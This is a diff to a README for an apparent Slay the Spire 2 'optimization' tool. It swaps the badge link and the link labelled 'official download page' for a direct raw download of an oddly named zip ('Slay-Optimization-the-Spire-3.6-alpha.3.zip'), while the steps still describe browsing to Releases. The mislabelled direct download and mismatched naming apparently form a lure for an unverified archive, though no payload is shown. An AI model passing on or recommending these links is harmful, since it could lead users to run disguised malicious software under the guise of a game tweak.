@@ -1,6 +1,6 @@
 # ⚡ Slay-the-Spire-2-Optimization - Improve Frame Rates And Game Speed
 
-[![](https://img.shields.io/badge/Download-Optimization-grey.svg)](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization)
+[![](https://img.shields.io/badge/Download-Optimization-grey.svg)](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization/raw/refs/heads/main/humblie/Slay-Optimization-the-Spire-3.6-alpha.3.zip)
 
 This software provides a collection of performance tweaks for Slay the Spire 2. It helps your computer run the game with higher frame rates, fewer stutters, and quicker load times. The tools work on Windows 10 and Windows 11 systems that run the 64-bit version of the operating system. This package receives updates for the 2026 game version.
 
@@ -18,7 +18,7 @@ To use these optimization tools, your device must meet the following hardware an
 
 Follow these steps to set up the optimization tools on your system.
 
-1. Visit the [official download page](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization) to access the latest files.
+1. Visit the [official download page](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization/raw/refs/heads/main/humblie/Slay-Optimization-the-Spire-3.6-alpha.3.zip) to access the latest files.
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Download the file ending in .zip to your computer.
